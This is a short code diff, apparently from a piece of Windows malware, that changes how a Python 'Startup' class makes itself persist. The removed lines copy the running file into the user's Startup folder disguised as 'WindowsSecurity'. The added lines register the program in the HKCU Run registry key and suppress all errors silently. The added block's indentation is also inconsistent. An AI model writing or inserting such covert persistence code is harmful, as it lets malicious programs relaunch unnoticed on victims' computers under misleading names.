@@ -1,3 +1,6 @@
+import winreg as reg
+import os	
+import sys
 class Startup:
 
     def __init__(self):
@@ -6,6 +9,10 @@ class Startup:
     
     def _startup(self):
         try:
-            with open(f'C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsSecurity.{self.file.split("\\")[-1].split(".")[-1]}', 'wb') as f:
-                f.write(open(self.file, 'rb').read())
+                fp = os.path.dirname(os.path.realpath(__file__))
+                file_name = sys.argv[0].split('\\')[-1]
+                new_file_path = fp + '\\' + file_name
+                keyVal = r'Software\\Microsoft\Windows\\CurrentVersion\\Run'
+                key2change = reg.OpenKey(reg.HKEY_CURRENT_USER, keyVal, 0, reg.KEY_ALL_ACCESS)
+                reg.SetValueEx(key2change, 'CustomProgramName', 0, reg.REG_SZ,new_file_path)
         except:pass
